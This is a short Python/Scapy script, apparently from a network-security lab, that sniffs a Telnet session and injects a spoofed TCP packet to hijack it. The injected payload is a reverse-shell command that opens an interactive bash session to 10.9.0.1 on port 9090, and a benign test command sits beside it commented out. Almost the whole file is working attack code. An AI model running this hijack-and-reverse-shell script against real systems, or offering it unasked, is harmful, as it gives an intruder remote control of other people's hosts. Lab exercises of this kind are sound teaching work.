#!/usr/bin/python3
from scapy.all import *
import sys

def spoof(pkt):
    old_ip  = pkt[IP]
    old_tcp = pkt[TCP]
    tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs * 4  # TCP data length

    newseq = old_tcp.ack + 10
    newack = old_tcp.seq + tcp_len

    ip  = IP(src=old_ip.dst, dst=old_ip.src)
    tcp = TCP(sport=old_tcp.dport, dport=old_tcp.sport, flags="A", 
              seq=newseq, ack=newack)
    #data = "\ntouch /tmp/success\n"
    data = "\n/bin/bash -i >/dev/tcp/10.9.0.1/9090 0<&1 2>&1\n"
    pkt = ip/tcp/data
    ls(pkt)
    send(pkt,verbose=0)
    quit()

cli = sys.argv[1]
srv = sys.argv[2]

myFilter = 'tcp and src host {} and dst host {} and src port 23'.format(srv, cli)
print("Running Session Hijacking attack ...")
print("Filter used: {}".format(myFilter))
print("Spoofing TCP packets from Client ({}) to Server ({})".format(cli, srv))

# Change the iface field with the actual name on your container
sniff(iface='br-7fa07fc9a0a6', filter=myFilter, prn=spoof)

